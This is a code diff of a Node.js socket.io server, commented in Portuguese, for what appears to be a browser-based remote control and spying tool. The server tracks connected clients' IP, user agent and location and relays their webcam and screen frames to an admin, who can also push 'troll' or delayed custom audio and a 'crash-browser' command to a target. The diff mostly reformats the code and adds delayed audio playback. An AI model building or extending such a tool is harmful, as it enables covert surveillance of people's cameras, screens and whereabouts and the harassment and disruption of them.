@@ -1,6 +1,6 @@
-const express  = require('express');
-const http     = require('http');
-const path     = require('path');
+const express   = require('express');
+const http      = require('http');
+const path      = require('path');
 const { Server } = require('socket.io');
 const { v4: uuid } = require('uuid');
 
@@ -22,7 +22,7 @@ io.on('connection', socket=>{
     const ua  = socket.handshake.headers['user-agent'] || 'desconhecido';
 
     clients.set(id,{ uuid:id, ip, ua, connected_at:Date.now(),
-                     socket, watchers:[], screenWatchers:[] });     // <<
+                     socket, watchers:[], screenWatchers:[] });
 
     socket.emit('id',id);
     broadcastClients();
@@ -32,12 +32,10 @@ io.on('connection', socket=>{
       if(c) c.watchers.forEach(w=>io.to(w).emit('frame',{id,data:dataURL}));
     });
 
-    /* NOVO: frames de tela */
-    socket.on('screen-frame',dataURL=>{                                   // <<
-      const c = clients.get(id);                                          // <<
-      if(c) c.screenWatchers.forEach(w=>io.to(w).emit('screen-frame',{    // <<
-          id,data:dataURL}));                                             // <<
-    });                                                                   // <<
+    socket.on('screen-frame',dataURL=>{
+      const c = clients.get(id);
+      if(c) c.screenWatchers.forEach(w=>io.to(w).emit('screen-frame',{id,data:dataURL}));
+    });
 
     socket.on('location',loc=>{
       const c=clients.get(id);
@@ -45,7 +43,8 @@ io.on('connection', socket=>{
     });
 
     socket.on('disconnect',()=>{
-      clients.delete(id); broadcastClients();
+      clients.delete(id);
+      broadcastClients();
     });
   }
 
@@ -53,6 +52,7 @@ io.on('connection', socket=>{
   if(role==='admin'){
     socket.emit('clients', summary());
 
+    /* ----- Pedir/parar streams ----- */
     socket.on('request-stream', uuid=>{
       const c=clients.get(uuid);
       if(c && !c.watchers.includes(socket.id)) c.watchers.push(socket.id);
@@ -62,47 +62,61 @@ io.on('connection', socket=>{
       if(c) c.watchers = c.watchers.filter(x=>x!==socket.id);
     });
 
-    /* NOVO: pedir / parar tela */
-    socket.on('request-screen', uuid=>{                                   // <<
-      const c=clients.get(uuid);                                          // <<
-      if(c && !c.screenWatchers.includes(socket.id))                      // <<
-           c.screenWatchers.push(socket.id);                              // <<
-    });                                                                   // <<
-    socket.on('stop-screen', uuid=>{                                      // <<
-      const c=clients.get(uuid);                                          // <<
-      if(c) c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id); // <<
-    });                                                                   // <<
+    socket.on('request-screen', uuid=>{
+      const c=clients.get(uuid);
+      if(c && !c.screenWatchers.includes(socket.id)) c.screenWatchers.push(socket.id);
+    });
+    socket.on('stop-screen', uuid=>{
+      const c=clients.get(uuid);
+      if(c) c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);
+    });
 
-    
-    /* áudio (igual) */
+    /* ----- Áudios ----- */
     socket.on('troll-audio', uuid=>{
       const c=clients.get(uuid);
-      if(c) c.socket.emit('play-audio',{ url:'https://actions.google.com/sounds/v1/ambiences/subway_station_nyc.ogg' });
+      if(c) c.socket.emit('play-audio',{url:'https://actions.google.com/sounds/v1/ambiences/subway_station_nyc.ogg'});
     });
-    socket.on('custom-audio',({uuid,dataURL})=>{
+
+    // gravação personalizada (delay em s)
+    socket.on('custom-audio',({uuid,dataURL,delay=0})=>{
       const c=clients.get(uuid);
-      if(c) c.socket.emit('play-audio',{url:dataURL});
+      if(c){
+        setTimeout(()=>{
+          c.socket.emit('play-audio',{url:dataURL});
+        }, delay*1000);
+      }
     });
+
+    // áudio pronto da lista (delay em s)
+    socket.on('ready-audio',({uuid,url,delay=0})=>{
+      const c=clients.get(uuid);
+      if(c){
+        setTimeout(()=>{
+          c.socket.emit('play-audio',{url});
+        }, delay*1000);
+      }
+    });
+
     socket.on('stop-audio', uuid=>{
       const c=clients.get(uuid);
       if(c) c.socket.emit('stop-audio');
     });
 
-    socket.on('crash-browser', uuid => {
-   const c = clients.get(uuid);
-   if (c) c.socket.emit('crash-browser');
- });
+    socket.on('crash-browser', uuid=>{
+      const c=clients.get(uuid);
+      if(c) c.socket.emit('crash-browser');
+    });
 
     socket.on('disconnect',()=>{
       for(const c of clients.values()){
         c.watchers       = c.watchers.filter(x=>x!==socket.id);
-        c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);     // <<
+        c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);
       }
     });
   }
 });
 
-/* utilidades */
+/* ---------- util ---------- */
 function summary(){
   return Array.from(clients.values()).map(c=>({
     uuid:c.uuid, ip:c.ip, ua:c.ua,
